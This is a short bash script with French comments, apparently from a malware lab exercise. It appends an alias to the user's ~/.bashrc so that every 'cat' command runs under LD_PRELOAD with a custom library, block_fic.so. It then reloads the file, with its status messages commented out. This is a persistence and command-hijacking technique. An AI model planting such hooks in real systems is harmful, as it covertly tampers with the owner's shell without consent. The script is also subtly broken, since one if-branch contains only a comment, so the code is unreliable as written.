#!/bin/bash

# Vérifier si block_fic.so existe
if [ ! -f "/home/debian/Bureau/malware/block_fic.so" ]; then
    #echo "Erreur : /home/debian/Bureau/malware/block_fic.so introuvable. Compile d'abord block_fic.c !"
    exit 1
fi

# Vérifier si l'alias 'cat' existe déjà dans ~/.bashrc
if grep -q "alias cat='LD_PRELOAD=/home/debian/Bureau/malware/block_fic.so /bin/cat'" ~/.bashrc; then
    #echo "L'alias 'cat' est déjà présent dans ~/.bashrc."
else
    # Ajouter l'alias pour la commande 'cat' avec le bon chemin absolu dans ~/.bashrc
    echo "alias cat='LD_PRELOAD=/home/debian/Bureau/malware/block_fic.so /bin/cat'" >> ~/.bashrc
    #echo "Alias 'cat' ajouté à ~/.bashrc."
fi

# Appliquer immédiatement l'alias en rechargeant .bashrc
source ~/.bashrc

# Afficher un message pour indiquer que l'alias a été ajouté ou déjà existant
# echo "Alias 'cat' avec block_fic.so ajouté ou déjà existant. Vous pouvez maintenant utiliser la commande 'cat' pour bloquer l'accès au fichier test.txt."
